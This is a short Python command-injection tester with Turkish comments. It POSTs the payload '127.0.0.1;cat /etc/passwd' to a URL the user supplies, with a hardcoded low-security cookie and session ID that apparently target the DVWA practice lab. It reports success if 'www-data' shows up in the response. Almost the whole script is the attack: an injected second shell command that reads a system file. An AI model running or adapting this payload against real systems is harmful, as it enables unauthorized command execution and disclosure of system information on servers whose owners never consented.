import requests
#bu yazılım sahibi belirtilecek şekilde değiştirilebilir veya geliştirilebilir sadece, aksi takdirde dava açılır.
print("""

┌───── •✧✧• ─────┐
 -Yapımcı Mike adams 
└───── •✧✧• ─────┘
Command İnjection tool v1.0
""")
urll=input("url giriniz: ")
header={"Cookie": "security=low; PHPSESSID=a0b29e43b154e8cf261c3a93686bdd94"}
url=urll
data={"ip":"127.0.0.1;cat /etc/passwd","sumbit":"sumbit"}
sonuc=requests.post(url=url,data=data,headers=header)
if "www-data" in str(sonuc.content):
    print("Command injection bulundu")
else:
    print("command injection bulunamadı")
